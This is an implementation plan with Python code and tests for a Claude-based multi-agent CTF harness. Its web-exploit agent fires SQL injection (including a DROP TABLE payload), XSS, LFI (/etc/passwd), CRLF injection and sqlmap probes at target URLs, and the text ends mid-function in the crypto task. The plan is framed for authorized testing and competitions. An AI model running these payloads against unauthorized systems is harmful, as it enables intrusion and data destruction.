# Agent Harness Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a multi-agent orchestration harness with 4 specialized agents (Recon, Web Exploit, Crypto, Report) and a semi-autonomous orchestrator for CTF competitions.

**Architecture:** Modular package with a shared in-memory state store. Each agent extends a BaseAgent class that handles the Anthropic API agentic loop. The orchestrator (`harness.py`) is an interactive CLI that uses an LLM to propose actions and waits for user approval before dispatching agents.

**Tech Stack:** Python 3.11+, anthropic SDK, no external frameworks

## Global Constraints

- Model: `claude-sonnet-4-6` for all agents and orchestrator
- Single shared Anthropic client instance
- All state in-memory (dict), no database
- Reports saved as markdown to `reports/` directory
- Max 20 iterations per agent run
- UTF-8 output encoding for Windows terminal compatibility
- Reuse existing tool implementations from `recon_agent.py` (do not duplicate)
- Target validation: only allow `[a-zA-Z0-9._:-/]` characters

---

### Task 1: Shared State Module

**Files:**
- Create: `state.py`
- Test: `tests/test_state.py`

**Interfaces:**
- Consumes: nothing (foundational module)
- Produces:
  - `create_state() -> dict` — returns a new empty state dict
  - `add_target(state: dict, target: str) -> None` — adds a target with pending status and empty findings
  - `get_target(state: dict, target: str) -> dict` — returns target entry or raises KeyError
  - `update_findings(state: dict, target: str, category: str, data) -> None` — appends/merges data into a findings category
  - `set_target_status(state: dict, target: str, status: str) -> None` — sets target status
  - `add_history(state: dict, entry: str) -> None` — appends a timestamped entry to history
  - `get_pending_targets(state: dict) -> list[str]` — returns targets with status "pending"
  - `format_state_summary(state: dict) -> str` — returns a human-readable summary of all targets and their status
  - `format_target_findings(state: dict, target: str) -> str` — returns formatted findings for one target

- [ ] **Step 1: Write failing tests**

```python
# tests/test_state.py
import pytest
from state import (
    create_state, add_target, get_target, update_findings,
    set_target_status, add_history, get_pending_targets,
    format_state_summary, format_target_findings,
)


def test_create_state_returns_empty_structure():
    s = create_state()
    assert s == {"targets": {}, "queue": [], "history": []}


def test_add_target_creates_entry():
    s = create_state()
    add_target(s, "10.10.10.1")
    t = s["targets"]["10.10.10.1"]
    assert t["status"] == "pending"
    assert t["findings"]["ports"] == []
    assert t["findings"]["services"] == {}
    assert t["findings"]["web_paths"] == []
    assert t["findings"]["dns"] == {}
    assert t["findings"]["vulns"] == []
    assert t["findings"]["crypto"] == []
    assert t["findings"]["notes"] == []


def test_add_target_duplicate_is_noop():
    s = create_state()
    add_target(s, "10.10.10.1")
    s["targets"]["10.10.10.1"]["status"] = "scanning"
    add_target(s, "10.10.10.1")
    assert s["targets"]["10.10.10.1"]["status"] == "scanning"


def test_get_target_returns_entry():
    s = create_state()
    add_target(s, "10.10.10.1")
    t = get_target(s, "10.10.10.1")
    assert t["status"] == "pending"


def test_get_target_missing_raises():
    s = create_state()
    with pytest.raises(KeyError):
        get_target(s, "10.10.10.1")


def test_update_findings_appends_to_list():
    s = create_state()
    add_target(s, "10.10.10.1")
    update_findings(s, "10.10.10.1", "ports", [22, 80])
    update_findings(s, "10.10.10.1", "ports", [443])
    assert s["targets"]["10.10.10.1"]["findings"]["ports"] == [22, 80, 443]


def test_update_findings_merges_dict():
    s = create_state()
    add_target(s, "10.10.10.1")
    update_findings(s, "10.10.10.1", "services", {"80": "Apache"})
    update_findings(s, "10.10.10.1", "services", {"22": "OpenSSH"})
    assert s["targets"]["10.10.10.1"]["findings"]["services"] == {
        "80": "Apache", "22": "OpenSSH"
    }


def test_set_target_status():
    s = create_state()
    add_target(s, "10.10.10.1")
    set_target_status(s, "10.10.10.1", "scanning")
    assert s["targets"]["10.10.10.1"]["status"] == "scanning"


def test_add_history():
    s = create_state()
    add_history(s, "Started recon on 10.10.10.1")
    assert len(s["history"]) == 1
    assert "Started recon on 10.10.10.1" in s["history"][0]


def test_get_pending_targets():
    s = create_state()
    add_target(s, "10.10.10.1")
    add_target(s, "10.10.10.2")
    set_target_status(s, "10.10.10.1", "done")
    assert get_pending_targets(s) == ["10.10.10.2"]


def test_format_state_summary():
    s = create_state()
    add_target(s, "10.10.10.1")
    summary = format_state_summary(s)
    assert "10.10.10.1" in summary
    assert "pending" in summary


def test_format_target_findings():
    s = create_state()
    add_target(s, "10.10.10.1")
    update_findings(s, "10.10.10.1", "ports", [22, 80])
    output = format_target_findings(s, "10.10.10.1")
    assert "22" in output
    assert "80" in output
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_state.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'state'`

- [ ] **Step 3: Implement state.py**

```python
# state.py
"""Shared in-memory state store for the agent harness."""

from datetime import datetime, timezone


def create_state() -> dict:
    """Return a new empty state dict."""
    return {"targets": {}, "queue": [], "history": []}


def add_target(state: dict, target: str) -> None:
    """Add a target with pending status. No-op if target already exists."""
    if target in state["targets"]:
        return
    state["targets"][target] = {
        "status": "pending",
        "assigned_agent": "",
        "findings": {
            "ports": [],
            "services": {},
            "web_paths": [],
            "dns": {},
            "vulns": [],
            "crypto": [],
            "notes": [],
        },
    }


def get_target(state: dict, target: str) -> dict:
    """Return target entry. Raises KeyError if not found."""
    return state["targets"][target]


def update_findings(state: dict, target: str, category: str, data) -> None:
    """Append (list) or merge (dict) data into a findings category."""
    findings = state["targets"][target]["findings"]
    if isinstance(findings[category], list):
        if isinstance(data, list):
            findings[category].extend(data)
        else:
            findings[category].append(data)
    elif isinstance(findings[category], dict):
        findings[category].update(data)


def set_target_status(state: dict, target: str, status: str) -> None:
    """Set target status to pending, scanning, or done."""
    state["targets"][target]["status"] = status


def add_history(state: dict, entry: str) -> None:
    """Append a timestamped entry to the history log."""
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    state["history"].append(f"[{ts}] {entry}")


def get_pending_targets(state: dict) -> list[str]:
    """Return list of target names with status 'pending'."""
    return [t for t, v in state["targets"].items() if v["status"] == "pending"]


def format_state_summary(state: dict) -> str:
    """Return a human-readable summary of all targets."""
    if not state["targets"]:
        return "No targets added yet."
    lines = []
    for target, info in state["targets"].items():
        port_count = len(info["findings"]["ports"])
        vuln_count = len(info["findings"]["vulns"])
        lines.append(f"  {target:30s} status={info['status']:10s} ports={port_count} vulns={vuln_count}")
    return "Targets:\n" + "\n".join(lines)


def format_target_findings(state: dict, target: str) -> str:
    """Return formatted findings for one target."""
    info = state["targets"][target]
    lines = [f"Findings for {target} (status: {info['status']})"]
    f = info["findings"]
    if f["ports"]:
        lines.append(f"  Ports: {', '.join(str(p) for p in f['ports'])}")
    if f["services"]:
        for port, svc in f["services"].items():
            lines.append(f"  Service {port}: {svc}")
    if f["web_paths"]:
        lines.append(f"  Web paths: {', '.join(f['web_paths'])}")
    if f["dns"]:
        for rtype, val in f["dns"].items():
            lines.append(f"  DNS {rtype}: {val}")
    if f["vulns"]:
        lines.append(f"  Vulns ({len(f['vulns'])}):")
        for v in f["vulns"]:
            lines.append(f"    - {v}")
    if f["crypto"]:
        lines.append(f"  Crypto ({len(f['crypto'])}):")
        for c in f["crypto"]:
            lines.append(f"    - {c}")
    if f["notes"]:
        lines.append(f"  Notes:")
        for n in f["notes"]:
            lines.append(f"    - {n}")
    return "\n".join(lines)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_state.py -v`
Expected: all 13 tests PASS

- [ ] **Step 5: Commit**

```bash
git add state.py tests/test_state.py
git commit -m "feat: add shared state module for agent harness"
```

---

### Task 2: Base Agent Class

**Files:**
- Create: `agents/__init__.py`
- Create: `agents/base.py`
- Test: `tests/test_base_agent.py`

**Interfaces:**
- Consumes: `state.py` functions, `anthropic` SDK, `recon_agent.run_cmd` (for tool execution)
- Produces:
  - `BaseAgent.__init__(self, name: str, system_prompt: str, tools: list[dict], tool_dispatch: dict[str, callable], client: anthropic.Anthropic)` — constructor
  - `BaseAgent.run(self, task: str, state: dict) -> str` — runs the agentic loop, returns the final text response
  - `BaseAgent.max_iterations: int` — defaults to 20
  - `BaseAgent.model: str` — defaults to `claude-sonnet-4-6`

- [ ] **Step 1: Write failing tests**

```python
# tests/test_base_agent.py
import pytest
from unittest.mock import MagicMock, patch
from agents.base import BaseAgent


def make_mock_client(responses):
    """Create a mock Anthropic client that returns predefined responses."""
    client = MagicMock()
    call_count = [0]

    def mock_create(**kwargs):
        idx = min(call_count[0], len(responses) - 1)
        call_count[0] += 1
        return responses[idx]

    client.messages.create = MagicMock(side_effect=mock_create)
    return client


def make_text_response(text):
    """Mock response with just text (end_turn)."""
    block = MagicMock()
    block.type = "text"
    block.text = text
    resp = MagicMock()
    resp.content = [block]
    resp.stop_reason = "end_turn"
    return resp


def make_tool_response(tool_name, tool_input, tool_id="tc_1"):
    """Mock response with a tool call."""
    block = MagicMock()
    block.type = "tool_use"
    block.name = tool_name
    block.input = tool_input
    block.id = tool_id
    resp = MagicMock()
    resp.content = [block]
    resp.stop_reason = "tool_use"
    return resp


def test_base_agent_init():
    client = MagicMock()
    agent = BaseAgent("test", "You are a test agent.", [], {}, client)
    assert agent.name == "test"
    assert agent.max_iterations == 20


def test_base_agent_run_text_only():
    client = make_mock_client([make_text_response("Hello world")])
    agent = BaseAgent("test", "You are a test agent.", [], {}, client)
    result = agent.run("say hello", {})
    assert result == "Hello world"


def test_base_agent_run_with_tool_call():
    tool_resp = make_tool_response("echo", {"msg": "hi"})
    text_resp = make_text_response("Done")
    client = make_mock_client([tool_resp, text_resp])

    dispatch = {"echo": lambda msg: f"echoed: {msg}"}
    tools = [{"name": "echo", "description": "echo", "input_schema": {"type": "object", "properties": {"msg": {"type": "string"}}, "required": ["msg"]}}]

    agent = BaseAgent("test", "prompt", tools, dispatch, client)
    result = agent.run("echo hi", {})
    assert result == "Done"
    assert client.messages.create.call_count == 2


def test_base_agent_max_iterations():
    tool_resp = make_tool_response("echo", {"msg": "hi"})
    client = make_mock_client([tool_resp] * 25)

    dispatch = {"echo": lambda msg: f"echoed: {msg}"}
    tools = [{"name": "echo", "description": "echo", "input_schema": {"type": "object", "properties": {"msg": {"type": "string"}}, "required": ["msg"]}}]

    agent = BaseAgent("test", "prompt", tools, dispatch, client)
    agent.max_iterations = 3
    result = agent.run("loop forever", {})
    assert client.messages.create.call_count == 3
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_base_agent.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'agents'`

- [ ] **Step 3: Implement agents/\_\_init\_\_.py and agents/base.py**

```python
# agents/__init__.py
```

```python
# agents/base.py
"""Base agent class — shared agentic loop for all agents."""

import sys

import anthropic

# Fix Windows terminal encoding
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

MODEL = "claude-sonnet-4-6"


class BaseAgent:
    def __init__(
        self,
        name: str,
        system_prompt: str,
        tools: list[dict],
        tool_dispatch: dict[str, callable],
        client: anthropic.Anthropic,
    ):
        self.name = name
        self.system_prompt = system_prompt
        self.tools = tools
        self.tool_dispatch = tool_dispatch
        self.client = client
        self.model = MODEL
        self.max_iterations = 20

    def run(self, task: str, state: dict) -> str:
        """Run the agentic loop. Returns the final text response."""
        messages = [{"role": "user", "content": task}]

        print(f"\n[{self.name}] Starting — {task[:80]}")

        for iteration in range(1, self.max_iterations + 1):
            print(f"[{self.name}] Iteration {iteration}")

            try:
                response = self.client.messages.create(
                    model=self.model,
                    system=self.system_prompt,
                    messages=messages,
                    tools=self.tools if self.tools else anthropic.NOT_GIVEN,
                    max_tokens=4096,
                )
            except Exception as e:
                print(f"[{self.name}] ERROR: API call failed: {e}")
                return f"ERROR: {e}"

            messages.append({"role": "assistant", "content": response.content})

            if response.stop_reason == "end_turn":
                result = ""
                for block in response.content:
                    if block.type == "text":
                        result += block.text
                print(f"[{self.name}] Done ({iteration} iterations)")
                return result

            # Execute tool calls
            tool_results = []
            for block in response.content:
                if block.type == "tool_use":
                    fn_name = block.name
                    fn_args = block.input

                    print(f"  [{self.name}] -> {fn_name}({', '.join(f'{k}={v!r}' for k, v in fn_args.items())})")

                    if fn_name in self.tool_dispatch:
                        result = self.tool_dispatch[fn_name](**fn_args)
                    else:
                        result = f"Unknown tool: {fn_name}"

                    tool_results.append({
                        "type": "tool_result",
                        "tool_use_id": block.id,
                        "content": result,
                    })

            if tool_results:
                messages.append({"role": "user", "content": tool_results})

        print(f"[{self.name}] WARNING: max iterations reached")
        return "Max iterations reached without final response."
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_base_agent.py -v`
Expected: all 4 tests PASS

- [ ] **Step 5: Commit**

```bash
git add agents/__init__.py agents/base.py tests/test_base_agent.py
git commit -m "feat: add BaseAgent class with agentic loop"
```

---

### Task 3: Recon Agent (migrate from recon_agent.py)

**Files:**
- Create: `agents/recon.py`
- Test: `tests/test_recon_agent.py`

**Interfaces:**
- Consumes: `BaseAgent` from `agents/base.py`, tool functions from `recon_agent.py`, `state.py` functions
- Produces:
  - `RECON_TOOLS: list[dict]` — Anthropic tool definitions (reused from recon_agent.py)
  - `RECON_DISPATCH: dict[str, callable]` — tool name to function mapping
  - `RECON_SYSTEM_PROMPT: str` — system prompt for recon
  - `create_recon_agent(client: anthropic.Anthropic) -> BaseAgent` — factory function

- [ ] **Step 1: Write failing tests**

```python
# tests/test_recon_agent.py
from unittest.mock import MagicMock
from agents.recon import create_recon_agent, RECON_TOOLS, RECON_DISPATCH, RECON_SYSTEM_PROMPT


def test_recon_tools_defined():
    assert len(RECON_TOOLS) == 10
    names = [t["name"] for t in RECON_TOOLS]
    assert "nmap_scan" in names
    assert "dns_lookup" in names
    assert "gobuster_scan" in names
    assert "nikto_scan" in names
    assert "subfinder_enum" in names


def test_recon_dispatch_matches_tools():
    tool_names = {t["name"] for t in RECON_TOOLS}
    dispatch_names = set(RECON_DISPATCH.keys())
    assert tool_names == dispatch_names


def test_recon_system_prompt_exists():
    assert "reconnaissance" in RECON_SYSTEM_PROMPT.lower()


def test_create_recon_agent():
    client = MagicMock()
    agent = create_recon_agent(client)
    assert agent.name == "recon"
    assert len(agent.tools) == 10
    assert len(agent.tool_dispatch) == 10
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_recon_agent.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'agents.recon'`

- [ ] **Step 3: Implement agents/recon.py**

Import the existing tools, tool definitions, and dispatch from `recon_agent.py` rather than duplicating them.

```python
# agents/recon.py
"""Recon agent — wraps the existing recon_agent.py tools into a BaseAgent."""

import anthropic

from agents.base import BaseAgent
from recon_agent import TOOLS as RECON_TOOLS
from recon_agent import TOOL_DISPATCH as RECON_DISPATCH
from recon_agent import SYSTEM_PROMPT as RECON_SYSTEM_PROMPT


def create_recon_agent(client: anthropic.Anthropic) -> BaseAgent:
    """Create a recon agent instance."""
    return BaseAgent(
        name="recon",
        system_prompt=RECON_SYSTEM_PROMPT,
        tools=RECON_TOOLS,
        tool_dispatch=RECON_DISPATCH,
        client=client,
    )
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_recon_agent.py -v`
Expected: all 4 tests PASS

- [ ] **Step 5: Commit**

```bash
git add agents/recon.py tests/test_recon_agent.py
git commit -m "feat: add recon agent wrapping existing tools"
```

---

### Task 4: Web Exploit Agent

**Files:**
- Create: `agents/web_exploit.py`
- Test: `tests/test_web_exploit.py`

**Interfaces:**
- Consumes: `BaseAgent` from `agents/base.py`, `recon_agent.run_cmd` and `recon_agent.tool_curl`
- Produces:
  - `WEB_EXPLOIT_TOOLS: list[dict]` — tool definitions
  - `WEB_EXPLOIT_DISPATCH: dict[str, callable]` — tool dispatch
  - `WEB_EXPLOIT_SYSTEM_PROMPT: str`
  - `create_web_exploit_agent(client: anthropic.Anthropic) -> BaseAgent`

- [ ] **Step 1: Write failing tests**

```python
# tests/test_web_exploit.py
from unittest.mock import MagicMock
from agents.web_exploit import (
    create_web_exploit_agent, WEB_EXPLOIT_TOOLS, WEB_EXPLOIT_DISPATCH,
    WEB_EXPLOIT_SYSTEM_PROMPT,
    tool_sqli_probe, tool_xss_probe, tool_lfi_probe, tool_header_inject,
)


def test_web_exploit_tools_defined():
    names = [t["name"] for t in WEB_EXPLOIT_TOOLS]
    assert "curl_request" in names
    assert "sqli_probe" in names
    assert "xss_probe" in names
    assert "lfi_probe" in names
    assert "header_inject" in names


def test_dispatch_matches_tools():
    tool_names = {t["name"] for t in WEB_EXPLOIT_TOOLS}
    dispatch_names = set(WEB_EXPLOIT_DISPATCH.keys())
    assert tool_names == dispatch_names


def test_system_prompt_mentions_exploit():
    assert "exploit" in WEB_EXPLOIT_SYSTEM_PROMPT.lower() or "vulnerabilit" in WEB_EXPLOIT_SYSTEM_PROMPT.lower()


def test_create_web_exploit_agent():
    client = MagicMock()
    agent = create_web_exploit_agent(client)
    assert agent.name == "web_exploit"


def test_sqli_probe_returns_string():
    result = tool_sqli_probe("http://example.com/login", "id")
    assert isinstance(result, str)


def test_lfi_probe_returns_string():
    result = tool_lfi_probe("http://example.com/page", "file")
    assert isinstance(result, str)
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_web_exploit.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'agents.web_exploit'`

- [ ] **Step 3: Implement agents/web_exploit.py**

```python
# agents/web_exploit.py
"""Web exploit agent — probes for SQLi, XSS, LFI, header injection."""

import shutil

import anthropic

from agents.base import BaseAgent
from recon_agent import run_cmd, tool_curl


# --- Tool implementations ---

SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='1'--", "' UNION SELECT NULL--",
    "1' ORDER BY 1--", "' AND 1=1--", "' AND 1=2--",
    "admin'--", "1; DROP TABLE users--",
]

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    '<svg/onload=alert(1)>',
    '{{7*7}}',
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc/passwd",
    "../../../../windows/win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]


def tool_sqli_probe(url: str, parameter: str, method: str = "GET") -> str:
    """Test a URL parameter for SQL injection using common payloads."""
    results = []
    for payload in SQLI_PAYLOADS:
        if method == "GET":
            test_url = f"{url}?{parameter}={payload}"
            cmd = ["curl", "-s", "-S", "--max-time", "10", "-i", test_url]
        else:
            cmd = ["curl", "-s", "-S", "--max-time", "10", "-i", "-X", "POST",
                   "-d", f"{parameter}={payload}", url]

        output = run_cmd(cmd, timeout=15, label="sqli")
        indicators = ["sql", "syntax", "mysql", "postgresql", "sqlite", "oracle",
                       "error in your sql", "unclosed quotation", "quoted string"]
        found = [i for i in indicators if i.lower() in output.lower()]
        status = "POSSIBLE SQLi" if found else "no indicator"
        results.append(f"Payload: {payload}\n  Status: {status}\n  Indicators: {found}")

        if len(output) > 500:
            output = output[:500] + "..."
        results.append(f"  Response preview: {output[:200]}\n")

    return "\n".join(results)


def tool_xss_probe(url: str, parameter: str, method: str = "GET") -> str:
    """Test a URL parameter for reflected XSS using common payloads."""
    results = []
    for payload in XSS_PAYLOADS:
        if method == "GET":
            test_url = f"{url}?{parameter}={payload}"
            cmd = ["curl", "-s", "-S", "--max-time", "10", test_url]
        else:
            cmd = ["curl", "-s", "-S", "--max-time", "10", "-X", "POST",
                   "-d", f"{parameter}={payload}", url]

        output = run_cmd(cmd, timeout=15, label="xss")
        reflected = payload in output
        status = "REFLECTED (possible XSS)" if reflected else "not reflected"
        results.append(f"Payload: {payload}\n  Status: {status}")

    return "\n".join(results)


def tool_lfi_probe(url: str, parameter: str) -> str:
    """Test a URL parameter for Local File Inclusion."""
    results = []
    for payload in LFI_PAYLOADS:
        test_url = f"{url}?{parameter}={payload}"
        cmd = ["curl", "-s", "-S", "--max-time", "10", test_url]
        output = run_cmd(cmd, timeout=15, label="lfi")

        indicators = ["root:", "daemon:", "[fonts]", "[extensions]",
                       "<?php", "PD9waHA"]
        found = [i for i in indicators if i in output]
        status = "POSSIBLE LFI" if found else "no indicator"
        results.append(f"Payload: {payload}\n  Status: {status}\n  Indicators: {found}")

        if len(output) > 300:
            output = output[:300] + "..."
        results.append(f"  Response preview: {output[:200]}\n")

    return "\n".join(results)


def tool_header_inject(url: str) -> str:
    """Check for header injection and security header issues."""
    results = []

    # Check response headers
    cmd = ["curl", "-s", "-S", "--max-time", "10", "-I", url]
    headers = run_cmd(cmd, timeout=15, label="headers")
    results.append(f"Response headers:\n{headers}\n")

    # Check for missing security headers
    security_headers = [
        "Strict-Transport-Security", "X-Content-Type-Options",
        "X-Frame-Options", "Content-Security-Policy",
        "X-XSS-Protection", "Referrer-Policy",
    ]
    for h in security_headers:
        if h.lower() not in headers.lower():
            results.append(f"MISSING: {h}")
        else:
            results.append(f"PRESENT: {h}")

    # Test CRLF injection
    crlf_url = f"{url}/%0d%0aX-Injected:%20true"
    cmd = ["curl", "-s", "-S", "--max-time", "10", "-I", crlf_url]
    crlf_output = run_cmd(cmd, timeout=15, label="crlf")
    if "x-injected" in crlf_output.lower():
        results.append("\nCRLF INJECTION: POSSIBLE — injected header reflected")
    else:
        results.append("\nCRLF injection: not detected")

    return "\n".join(results)


def tool_sqlmap_scan(url: str, parameter: str = "", extra_flags: str = "") -> str:
    """Run sqlmap for automated SQL injection testing."""
    if not shutil.which("sqlmap"):
        return "ERROR: sqlmap is not installed. Install from https://sqlmap.org/"

    cmd = ["sqlmap", "-u", url, "--batch", "--level=2", "--risk=2", "--threads=4"]
    if parameter:
        cmd += ["-p", parameter]
    if extra_flags:
        cmd += extra_flags.split()

    return run_cmd(cmd, timeout=120, label="sqlmap")


# --- Tool definitions ---

WEB_EXPLOIT_TOOLS = [
    {
        "name": "curl_request",
        "description": "Make an HTTP/HTTPS request. Use for manual probing, checking responses, and sending custom payloads.",
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Full URL to request"},
                "method": {"type": "string", "enum": ["GET", "HEAD", "POST", "PUT", "OPTIONS"], "default": "GET"},
                "headers_only": {"type": "boolean", "default": False},
                "follow_redirects": {"type": "boolean", "default": True},
                "custom_headers": {"type": "array", "items": {"type": "string"}},
            },
            "required": ["url"],
        },
    },
    {
        "name": "sqli_probe",
        "description": "Test a URL parameter for SQL injection using common payloads. Checks for error-based SQLi indicators in responses.",
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL (e.g. http://target.com/login)"},
                "parameter": {"type": "string", "description": "Parameter name to test (e.g. 'id', 'username')"},
                "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
            },
            "required": ["url", "parameter"],
        },
    },
    {
        "name": "xss_probe",
        "description": "Test a URL parameter for reflected XSS. Checks if payloads are reflected in the response body.",
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL to test"},
                "parameter": {"type": "string", "description": "Parameter name to test"},
                "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
            },
            "required": ["url", "parameter"],
        },
    },
    {
        "name": "lfi_probe",
        "description": "Test a URL parameter for Local File Inclusion (LFI). Attempts to read /etc/passwd, win.ini, or use PHP wrappers.",
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base URL to test"},
                "parameter": {"type": "string", "description": "Parameter name to test (e.g. 'file', 'page', 'include')"},
            },
            "required": ["url", "parameter"],
        },
    },
    {
        "name": "header_inject",
        "description": "Check for missing security headers and test for CRLF header injection.",
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "URL to check"},
            },
            "required": ["url"],
        },
    },
    {
        "name": "sqlmap_scan",
        "description": "Run sqlmap for automated SQL injection detection and exploitation. Requires sqlmap installed.",
        "input_schema": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL with parameter (e.g. http://target.com/page?id=1)"},
                "parameter": {"type": "string", "description": "Specific parameter to test"},
                "extra_flags": {"type": "string", "description": "Additional sqlmap flags"},
            },
            "required": ["url"],
        },
    },
]

WEB_EXPLOIT_DISPATCH = {
    "curl_request": lambda **kw: tool_curl(**kw),
    "sqli_probe": lambda **kw: tool_sqli_probe(**kw),
    "xss_probe": lambda **kw: tool_xss_probe(**kw),
    "lfi_probe": lambda **kw: tool_lfi_probe(**kw),
    "header_inject": lambda **kw: tool_header_inject(**kw),
    "sqlmap_scan": lambda **kw: tool_sqlmap_scan(**kw),
}

WEB_EXPLOIT_SYSTEM_PROMPT = """You are a web exploitation agent for authorized security testing and CTF challenges.
Your job is to probe discovered web services for vulnerabilities.

You are given a target and its known web paths/services from prior recon.

Strategy:
1. Start by checking response headers for security misconfigurations (header_inject).
2. Identify input parameters on discovered pages using curl_request.
3. Test parameters for SQL injection using sqli_probe.
4. Test parameters for reflected XSS using xss_probe.
5. Test file-related parameters for Local File Inclusion using lfi_probe.
6. If sqlmap is available, run it on promising injection points.
7. Use curl_request to manually verify and explore any findings.

Report all findings clearly:
- Confirmed vulnerabilities (with evidence)
- Suspected vulnerabilities (with reasoning)
- Security misconfigurations
- Interesting behavior or error messages

Only test the specified target. Be thorough but do not cause denial of service."""


def create_web_exploit_agent(client: anthropic.Anthropic) -> BaseAgent:
    """Create a web exploit agent instance."""
    return BaseAgent(
        name="web_exploit",
        system_prompt=WEB_EXPLOIT_SYSTEM_PROMPT,
        tools=WEB_EXPLOIT_TOOLS,
        tool_dispatch=WEB_EXPLOIT_DISPATCH,
        client=client,
    )
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_web_exploit.py -v`
Expected: all 6 tests PASS

- [ ] **Step 5: Commit**

```bash
git add agents/web_exploit.py tests/test_web_exploit.py
git commit -m "feat: add web exploit agent with SQLi, XSS, LFI, header injection tools"
```

---

### Task 5: Crypto Agent

**Files:**
- Create: `agents/crypto.py`
- Test: `tests/test_crypto.py`

**Interfaces:**
- Consumes: `BaseAgent` from `agents/base.py`
- Produces:
  - `CRYPTO_TOOLS: list[dict]`, `CRYPTO_DISPATCH: dict`, `CRYPTO_SYSTEM_PROMPT: str`
  - `create_crypto_agent(client: anthropic.Anthropic) -> BaseAgent`
  - Tool functions: `tool_base64_decode(data)`, `tool_base64_encode(data)`, `tool_hex_decode(data)`, `tool_hash_identify(hash_str)`, `tool_rot_bruteforce(text)`, `tool_xor_bruteforce(data, max_key_len)`, `tool_frequency_analysis(text)`

- [ ] **Step 1: Write failing tests**

```python
# tests/test_crypto.py
from unittest.mock import MagicMock
from agents.crypto import (
    create_crypto_agent, CRYPTO_TOOLS, CRYPTO_DISPATCH,
    tool_base64_decode, tool_base64_encode, tool_hex_decode,
    tool_hash_identify, tool_rot_bruteforce, tool_frequency_analysis,
)


def test_crypto_tools_defined():
    names = [t["name"] for t in CRYPTO_TOOLS]
    assert "base64_decode" in names
    assert "base64_encode" in names
    assert "hex_decode" in names
    assert "hash_identify" in names
    assert "rot_bruteforce" in names
    assert "frequency_analysis" in names


def test_dispatch_matches_tools():
    tool_names = {t["name"] for t in CRYPTO_TOOLS}
    dispatch_names = set(CRYPTO_DISPATCH.keys())
    assert tool_names == dispatch_names


def test_create_crypto_agent():
    client = MagicMock()
    agent = create_crypto_agent(client)
    assert agent.name == "crypto"


def test_base64_decode():
    result = tool_base64_decode("SGVsbG8gV29ybGQ=")
    assert "Hello World" in result


def test_base64_encode():
    result = tool_base64_encode("Hello World")
    assert "SGVsbG8gV29ybGQ=" in result


def test_hex_decode():
    result = tool_hex_decode("48656c6c6f")
    assert "Hello" in result


def test_hash_identify_md5():
    result = tool_hash_identify("5d41402abc4b2a76b9719d911017c592")
    assert "MD5" in result


def test_hash_identify_sha256():
    result = tool_hash_identify("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
    assert "SHA-256" in result or "SHA256" in result


def test_rot_bruteforce():
    result = tool_rot_bruteforce("Uryyb Jbeyq")
    assert "Hello World" in result


def test_frequency_analysis():
    result = tool_frequency_analysis("aaabbbcccddd")
    assert "a" in result
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_crypto.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'agents.crypto'`

- [ ] **Step 3: Implement agents/crypto.py**

```python
# agents/crypto.py
"""Crypto agent — decoding, hash ID, cipher brute-force, frequency analysis."""

import base64
import binascii
import hashlib
import string
from collections import Counter

import anthropic

from agents.base import BaseAgent


# --- Tool implementations ---

def tool_base64_decode(data: str) -> str:
    """Decode a base64-encoded string."""
    try:
        decoded = base64.b64decode(data).decode("utf-8", errors="replace")
        return f"Decoded: {decoded}"
    except Exception as e:
        return f"ERROR decoding base64: {e}"


def tool_base64_encode(data: str) -> str:
    """Encode a string to base64."""
    encoded = base64.b64encode(data.encode()).decode()
    return f"Encoded: {encoded}"


def tool_hex_decode(data: str) -> str:
    """Decode a hex-encoded string."""
    try:
        clean = data.replace(" ", "").replace("0x", "").replace("\\x", "")
        decoded = bytes.fromhex(clean).decode("utf-8", errors="replace")
        return f"Decoded: {decoded}"
    except Exception as e:
        return f"ERROR decoding hex: {e}"


def tool_hash_identify(hash_str: str) -> str:
    """Identify the likely hash type based on length and character set."""
    h = hash_str.strip()
    length = len(h)
    results = []

    hash_types = {
        32: ["MD5", "NTLM"],
        40: ["SHA-1"],
        56: ["SHA-224"],
        64: ["SHA-256"],
        96: ["SHA-384"],
        128: ["SHA-512"],
    }

    if length in hash_types:
        try:
            int(h, 16)
            results.extend(hash_types[length])
        except ValueError:
            pass

    if h.startswith("$2b$") or h.startswith("$2a$") or h.startswith("$2y$"):
        results.append("bcrypt")
    elif h.startswith("$6$"):
        results.append("SHA-512 crypt")
    elif h.startswith("$5$"):
        results.append("SHA-256 crypt")
